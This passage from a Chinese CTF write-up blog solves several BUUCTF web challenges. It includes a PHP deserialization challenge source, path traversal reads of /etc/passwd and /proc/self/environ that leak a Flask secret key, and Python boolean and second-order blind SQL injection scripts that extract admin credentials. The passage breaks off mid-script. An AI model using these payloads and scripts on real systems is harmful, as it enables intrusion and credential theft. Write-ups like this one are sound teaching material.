id="æ€»ç»“æ€è·¯-1"><a href="#æ€»ç»“æ€è·¯-1" class="headerlink" title="æ€»ç»“æ€è·¯:"></a>æ€»ç»“æ€è·¯:</h4><p><code>/etc/passwd</code>ä¸‹æ˜¯å¦ç”±å¯ç”¨ä¿¡æ¯ï¼Ÿå®¶ç›®å½•åœ¨å“ªï¼Ÿurlå’Œå‚æ•°ä¸­é—´å­˜åœ¨å­—ç¬¦ä¸²æ—¶æ˜¯å¦è¦è€ƒè™‘å†™äº†è·¯ç”±ï¼ŸMACåœ°å€è·å–ï¼Ÿä¼ªéšæœºæ•°ï¼Ÿ</p><h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$store</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$expire</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$store</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flysystem&#x27;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-variable">$store</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;expire = <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$contents</span></span>) </span>&#123;<br>        <span class="hljs-variable">$cachedProperties</span> = <span class="hljs-title function_ invoke__">array_flip</span>([<br>            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,<br>            <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,<br>        ]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$contents</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span> =&gt; <span class="hljs-variable">$object</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$object</span>)) &#123;<br>                <span class="hljs-variable">$contents</span>[<span class="hljs-variable">$path</span>] = <span class="hljs-title function_ invoke__">array_intersect_key</span>(<span class="hljs-variable">$object</span>, <span class="hljs-variable">$cachedProperties</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$cleaned</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">cleanContents</span>(<span class="hljs-variable">$this</span>-&gt;cache);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-variable">$cleaned</span>, <span class="hljs-variable">$this</span>-&gt;complete]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$contents</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getForStorage</span>();<br><br>        <span class="hljs-variable language_">$this</span>-&gt;store-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-variable">$this</span>-&gt;expire);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;autosave) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">save</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span>(<span class="hljs-params"><span class="hljs-variable">$expire</span></span>): <span class="hljs-title">int</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$name</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$data</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$serialize</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$serialize</span>(<span class="hljs-variable">$data</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;writeTimes++;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$expire</span>)) &#123;<br>            <span class="hljs-variable">$expire</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];<br>        &#125;<br><br>        <span class="hljs-variable">$expire</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getExpireTime</span>(<span class="hljs-variable">$expire</span>);<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getCacheKey</span>(<span class="hljs-variable">$name</span>);<br><br>        <span class="hljs-variable">$dir</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$filename</span>);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>)) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-comment">// åˆ›å»ºå¤±è´¥</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$value</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<br>            <span class="hljs-comment">//æ•°æ®å‹ç¼©</span><br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">gzcompress</span>(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;src&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&quot;uploads/&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>))<br>&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br><br></code></pre></td></tr></table></figure><h2 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h2><p>å•†åº—ç±»å‹é¢˜ç›®ï¼Œä¸€å¼€å§‹æœ‰1336ï¼Œ1337æ‰èƒ½è´­ä¹°<code>flag</code>:</p><p><img src="/img/ctfhoneyshop1.png" alt="ctfhoneyshop1"></p><p>å³é”®æ²¡å•¥æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå…ˆæŠ“åŒ…çœ‹ä¸‹<code>cookie</code>:</p><p><img src="/img/ctfhoneyshop2.png" alt="ctfhoneyshop2"></p><p>çœ‹åˆ°é‡Œé¢æ··ç€å°æ•°ç‚¹è§‰å¾—æœ‰ç‚¹åƒ<code>JWT</code>ï¼Œè§£å¯†ä¸€ä¸‹çœ‹çœ‹ï¼š</p><p><img src="/img/ctfhoneyshop3.png" alt="ctfhoneyshop3"></p><p>è¿˜æœ‰ä¸ªå›¾ç‰‡ä¸‹è½½åŠŸèƒ½ï¼Œè¿™é‡Œå¾ˆå®¹æ˜“æƒ³åˆ°ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œä¸è¿‡è¦ä¸‹è½½å•¥æ˜¯ä¸ªé—®é¢˜ã€‚ã€‚</p><p><img src="/img/ctfhoneyshop4.png" alt="ctfhoneyshop4"></p><p><code>../../etc/passwd</code></p><p><img src="/img/ctfhoneyshop5.png" alt="ctfhoneyshop5"></p><p>å¥½åƒæ²¡ä¹±ç”¨ã€‚ã€‚å°è¯•ä¸‹è½½<code>app.py</code>å‘ç°å›æ˜¾<code>not allowed</code></p><p>åé¢çœ‹äº†ä¸‹<code>wp</code>å‘ç°è¦è¯»<code>/proc/self/environ</code>è¿™ä¸œè¥¿ï¼š</p><p><code>download?image=../../proc/self/environ</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/proc/</span>self<br><span class="hljs-regexp">//</span> å…¶è·¯å¾„æŒ‡å‘å½“å‰è¿›ç¨‹<br><br>/environ<br><span class="hljs-regexp">//</span> è®°å½•å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ä¿¡æ¯<br></code></pre></td></tr></table></figure><p><code>SECRET_KEY=ijbufup9Ma6ZKnCWzvhodHqVjNMPk6Nw4NTNnbdr</code></p><p>ç„¶å<code>flask-unsign</code>è§£å¯†å†åŠ å¯†å°±è¡Œã€‚</p><p><img src="/img/ctfhoneyshop6.png" alt="ctfhoneyshop6"></p><h4 id="æ€è·¯æ€»ç»“ï¼š-2"><a href="#æ€è·¯æ€»ç»“ï¼š-2" class="headerlink" title="æ€è·¯æ€»ç»“ï¼š"></a>æ€è·¯æ€»ç»“ï¼š</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">241148</span><span class="hljs-comment">#h2-1</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢é‚£ä¸ªä¸»è¦æ˜¯å¯¹<code>proc</code>ç›®å½•çš„ä¸€äº›è§£é‡Šã€‚</p><p>è¿˜æœ‰<code>secret_key</code>å¯ä»¥æ”¾åœ¨ç¯å¢ƒå˜é‡é‡Œã€‚</p><h2 id="Black-Watch-å…¥ç¾¤é¢˜-Web"><a href="#Black-Watch-å…¥ç¾¤é¢˜-Web" class="headerlink" title="[Black Watch å…¥ç¾¤é¢˜]Web"></a>[Black Watch å…¥ç¾¤é¢˜]Web</h2><p>ç™»å½•ç•Œé¢ç”¨æˆ·åå’Œå¯†ç æ˜¯æ˜æ–‡ä¼ è¾“ï¼š</p><p><img src="/img/blackwatch1.png" alt="blackwatch1"></p><p>çƒ­ç‚¹ç•Œé¢æŠ“åŒ…å¦‚ä¸‹ï¼š</p><p><img src="/img/blackwatch2.png" alt="blackwatch2"></p><p><code>id</code>è¿™ä¸ªä¸œè¥¿çœ‹ç€åƒæ³¨å…¥ç‚¹ï¼Œåé¢åŠ äº†ä¸ª<code>#</code>è¯•äº†ä¸‹å‘ç°æ­£å¸¸å›æ˜¾ï¼ŒåŠ <code>--+</code>å›æ˜¾<code>big big hack hack</code>ã€‚<code>FUZZ</code>ä¸‹ï¼š</p><p><img src="/img/blackwatch3.png" alt="blackwatch3"></p><p>è¿™äº›è¢«è¿‡æ»¤äº†ã€‚</p><p>è¯•äº†è¯•ä»€ä¹ˆç±»å‹çš„æ³¨å…¥ï¼Œè¿™ä¸œè¥¿ä¸ä¼šæŠ¥é”™ï¼Œå¦‚æœå­˜åœ¨é”™è¯¯å®ƒä¼šå›æ˜¾è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/blackwatch4.png" alt="blackwatch4"></p><p>ç®€å•å¸ƒå°”ç›²æ³¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://9b4209a2-7433-46b6-9b61-e30207ddf793.node5.buuoj.cn:81/backend/content_detail.php&#x27;</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    low=<span class="hljs-number">31</span><br>    high=<span class="hljs-number">127</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low&lt;=high:<br><br>        <span class="hljs-comment">#payload = &quot;if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;.format(i,mid) #çˆ†åº“ï¼šnews</span><br>        <span class="hljs-comment">#payload = &quot;if(Ascii(Substr((Select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;news&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;.format(i,mid)#çˆ†è¡¨ï¼šadmin,contents</span><br>        <span class="hljs-comment">#payload = &quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;admin&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;.format(i,mid) #çˆ†å­—æ®µï¼šid,username,password,is_enable</span><br>        <span class="hljs-comment">#payload = &quot;if(ascii(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;.format(i,mid) #çˆ†æ•°æ® 15cadb68,f4fc64e0</span><br>        payload = <span class="hljs-string">&quot;if(ascii(substr((select(group_concat(password))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span>.<span class="hljs-built_in">format</span>(i,mid) <span class="hljs-comment">#çˆ†æ•°æ® 07ab9020,43dc2dd9</span><br>        r = requests.get(url+<span class="hljs-string">&quot;?id=&quot;</span>+payload)<br>        <span class="hljs-comment">#r = requests.get(url=url,params=paylaod)</span><br>        time.sleep(<span class="hljs-number">0.03</span>)<br>        <span class="hljs-comment">#print(r.text)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;content&quot;</span> <span class="hljs-keyword">in</span> r.text):<br>            low = mid+<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid-<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>    result+=<span class="hljs-built_in">chr</span>(high+<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(result)<br>    time.sleep(<span class="hljs-number">0.03</span>)<br></code></pre></td></tr></table></figure><p>å¥½åƒæŒ‚ç€<code>VPN</code>ä¸ä¼šå‡ºä¹±ç ï¼Ÿ</p><h4 id="æ€è·¯æ€»ç»“ï¼š-3"><a href="#æ€è·¯æ€»ç»“ï¼š-3" class="headerlink" title="æ€è·¯æ€»ç»“ï¼š"></a>æ€è·¯æ€»ç»“ï¼š</h4><p>ç®€å•å¸ƒå°”ç›²æ³¨</p><h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>æŠ“åŒ…ï¼š</p><p><img src="/img/onlineproxy1.png" alt="onlineproxy1"></p><p>å›æ˜¾å­˜åœ¨<code>IP</code>ï¼Œä¼ªé€ ä¸€ä¸ªï¼Ÿ</p><p><img src="/img/onlineproxy2.png" alt="onlineproxy2"></p><p>æ–°<code>IP</code>ä¼šæŠŠæ—§çš„é¡¶æ‰ã€‚è¿™é‡Œæœ€å¼€å§‹æƒ³åˆ°æ˜¯äºŒæ¬¡æ³¨å…¥äº†ï¼Œä½†æ˜¯è¾“å…¥<code>1&#39; or &#39;1 </code>åå†æ‰“ä¸€ä¸ªæ–°<code>IP</code>å‘ç°è¿™ä¸ª<code>1&#39; or &#39;1</code>LASTIPå¹¶æ²¡å˜æˆ<code>1</code>ã€‚</p><p><a href="https://blog.csdn.net/qq_54929891/article/details/124464795">å‚è€ƒèµ„æ–™</a></p><blockquote><p>ç¬¬ä¸€æ¬¡è¾“å…¥1â€™orâ€™1â€™&#x3D;â€™1çš„æ—¶å€™ä¼šç›´æ¥æ˜¾ç¤ºå‡ºæ¥<br>ç¬¬äºŒæ¬¡è¾“å…¥2ï¼Œå› ä¸ºå’Œç¬¬ä¸€æ¬¡è¾“å…¥ä¸åŒï¼Œäºæ˜¯ç¬¬ä¸€æ¬¡è¾“å…¥å­˜å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œå¹¶æ˜¾ç¤ºåœ¨Last ipä¸­<br>ç¬¬ä¸‰æ¬¡è¾“å…¥2ï¼Œå› ä¸ºå’Œç¬¬äºŒæ¬¡è¾“å…¥ç›¸åŒï¼Œç›¸å½“äºæ¨¡æ‹Ÿçš„ipä¸å†å˜åŒ–ï¼Œå› æ­¤è¿™ä¸ªæ—¶å€™ä¼šåœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾ip2çš„last ipï¼Œæ‰§è¡Œäº†æŸ¥è¯¢æ“ä½œï¼Œå› æ­¤è¿™ä¸ªåœ°æ–¹æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨ç‚¹äº†</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://node4.buuoj.cn:28219/&#x27;</span><br> <br>res = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    left = <span class="hljs-number">31</span><span class="hljs-comment">#äºŒåˆ†æ³•å¿«é€ŸæŸ¥æ‰¾å…³é”®å­—</span><br>    right = <span class="hljs-number">127</span><br>    mid = left + ((right - left)&gt;&gt;<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> left &lt; right:<span class="hljs-comment">#ç›²æ³¨ï¼Œåˆ©ç”¨substrå°†æŸ¥è¯¢åˆ°çš„å­—ç¬¦åˆ‡å‰²ï¼Œç”¨asciiå‡½æ•°è½¬åŒ–ä¸ºasciiç ï¼Œåˆ©ç”¨äºŒåˆ†æ³•çš„ä¸­é—´å€¼æ¯”å¤§å°ç›´åˆ°æŸ¥è¯¢æˆåŠŸ</span><br>        <span class="hljs-comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span><br>        payload = <span class="hljs-string">&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        headers = &#123;<span class="hljs-comment">#ç¬¬ä¸€æ¬¡è¯·æ±‚ï¼Œæ˜¯ç”¨æˆ‘ä»¬çš„payloadï¼Œé˜²æ­¢cookieè¢«åˆ·æ–°å› æ­¤æˆ‘ä»¬å¤´éƒ¨è¯·æ±‚çš„æ—¶å€™å¿…é¡»è¦å¸¦ä¸Šcookie</span><br>                    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3&#x27;</span>,<span class="hljs-comment">#å¸¦cookieé˜²æ­¢åˆ·æ–°é‡ç½®</span><br>                    <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: payload<br>                    &#125;<br>        r = requests.post(url = url, headers = headers)<span class="hljs-comment">#å¤´æ–‡ä»¶ä¼ è¾“æ–¹æ³•</span><br> <br>        payload = <span class="hljs-string">&#x27;111&#x27;</span><br>        headers = &#123;<span class="hljs-comment">#åé¢å°±æ˜¯ç›¸åŒcookieçš„äºŒæ¬¡ä¸‰æ¬¡è¾“å…¥ï¼Œåªä¸ºäº†æ‰§è¡Œç¬¬ä¸€æ¬¡payloadçš„æŸ¥è¯¢è¯­å¥</span><br>                    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3&#x27;</span>,<br>                    <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: payload<br>                    &#125;<br>        r = requests.post(url = url, headers = headers)<br> <br>        payload = <span 